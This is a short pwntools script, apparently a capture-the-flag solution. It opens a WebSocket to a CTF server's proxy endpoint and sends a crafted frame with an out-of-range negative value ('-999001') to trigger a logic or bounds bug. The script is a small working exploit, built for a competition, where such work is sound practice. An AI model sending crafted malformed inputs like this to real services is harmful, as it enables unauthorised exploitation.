from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

r = remote('ctf.sdc.tf', 443, ssl=True)
r.sendline(b'GET /api/proxy/25e8d211-f05e-4fa1-9317-a9bb4255b171 HTTP/1.1')
r.sendline(b'Host: ctf.sdc.tf')
r.sendline(b'Upgrade: websocket')
r.sendline(b'Connection: Upgrade')
r.sendline(b'Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==')
r.sendline(b'Sec-WebSocket-Version: 13')
r.sendline(b'\r\n')

def send_websocket_frame(payload):
    frame = b"\x81" + bytes([len(payload)]) + payload
    r.send(frame)

send_websocket_frame(b"2\n-999001")

r.interactive()
